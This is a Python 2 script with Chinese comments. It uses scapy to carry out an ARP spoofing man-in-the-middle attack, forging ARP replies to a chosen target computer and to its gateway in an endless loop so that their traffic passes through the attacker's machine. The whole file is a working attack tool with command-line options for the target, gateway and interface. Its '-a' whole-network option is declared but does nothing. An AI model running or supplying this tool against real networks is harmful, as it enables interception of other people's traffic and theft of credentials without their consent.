#--*--coding=utf-8--*--

from scapy.all import *
import optparse
import threading

#解决在linux系统上运行时报的unicode编码相关错误
import sys
reload(sys)
sys.setdefaultencoding('utf-8')


def getMac(tgtIP):
    '''
    调用scapy的getmacbyip函数，获取攻击目标IP的MAC地址。
    '''
    try:
        tgtMac = getmacbyip(tgtIP)
        return tgtMac
    except:
        print '[-]请检查目标IP是否存活' 

def createArp2Station(srcMac,tgtMac,gatewayIP,tgtIP):
    '''
    生成ARP数据包，伪造网关欺骗目标计算机
    srcMac:本机的MAC地址，充当中间人
    tgtMac:目标计算机的MAC
    gatewayIP:网关的IP，将发往网关的数据指向本机（中间人），形成ARP攻击
    tgtIP:目标计算机的IP
    op=2,表示ARP响应
    '''
    pkt = Ether(src=srcMac,dst=tgtMac)/ARP(hwsrc=srcMac,psrc=gatewayIP,hwdst=tgtMac,pdst=tgtIP,op=2)
    return pkt

def createArp2Gateway(srcMac,gatewayMac,tgtIP,gatewayIP):
    '''
    生成ARP数据包，伪造目标计算机欺骗网关
    srcMac:本机的MAC地址，充当中间人
    gatewayMac:网关的MAC
    tgtIP:目标计算机的IP，将网关发往目标计算机的数据指向本机（中间人），形成ARP攻击
    gatewayIP:网关的IP
    op=2,表示ARP响应
    '''
    pkt = Ether(src=srcMac,dst=gatewayMac)/ARP(hwsrc=srcMac,psrc=tgtIP,hwdst=gatewayMac,pdst=gatewayIP,op=2)
    return pkt


def main():
    usage = 'Usage: %prog -t <targetip> -g <gatewayip> -i <interface> -a'
    parser = optparse.OptionParser(usage,version='v1.0')
    parser.add_option('-t',dest='targetIP',type='string',help='指定目标计算机IP')
    parser.add_option('-g',dest='gatewayIP',type='string',help='指定网关IP')
    parser.add_option('-i',dest='interface',type='string',help='指定使用的网卡')
    parser.add_option('-a',dest='allarp',action='store_true',help='是否进行全网arp欺骗')
    
    options,args = parser.parse_args()
    tgtIP = options.targetIP
    gatewayIP = options.gatewayIP
    interface = options.interface
  
    if tgtIP == None or gatewayIP == None or interface == None:
        print parser.print_help()
        exit(0)
    
    srcMac = get_if_hwaddr(interface)
    print '本机MAC地址是：',srcMac
    tgtMac = getMac(tgtIP)
    print '目标计算机MAC地址是：',tgtMac
    gatewayMac = getMac(gatewayIP)
    print '网关MAC地址是：',gatewayMac
    raw_input('按任意键继续：')


    pktstation = createArp2Station(srcMac,tgtMac,gatewayIP,tgtIP)
    pktgateway = createArp2Gateway(srcMac,gatewayMac,tgtIP,gatewayIP)

   
    i = 1
    while True:
        t = threading.Thread(target=sendp,args=(pktstation,),kwargs={'iface':interface})
        t.start()
        t.join()
        print str(i) + ' [*]发送一个计算机ARP欺骗包'
       
        s = threading.Thread(target=sendp,args=(pktgateway,),kwargs={'iface':interface,})
        s.start()
        s.join()
        print str(i) + ' [*]发送一个网关ARP欺骗包'
        i += 1       
        
            

if __name__ == '__main__':
    main()